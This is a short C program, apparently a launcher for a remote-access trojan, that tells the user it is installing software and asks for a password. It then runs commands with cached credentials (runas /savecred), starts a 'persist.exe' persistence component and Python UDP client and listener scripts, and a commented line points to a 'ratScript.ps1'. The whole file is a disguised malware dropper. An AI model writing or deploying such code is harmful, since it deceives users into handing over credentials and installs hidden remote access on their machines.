#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    printf("Installing now, please enter your password when prompted.\n");
    system("start python-3.8.1.exe\n");
    system("runas /savecred /user:IEUser setx path \"%PATH%;%homepath%\\appdata\\local\\programs\\python\\python38\"\n");
    system("runas /user:IEUser \"persist.exe\"\n");
    system("python ./UDP_Connection/client.py\n");
    system("python ./UDP_Connection/clientlistener.py\n");
    //system("%homepath%\\documents\\ourFolder\\ratScript.ps1");
    return 0;
}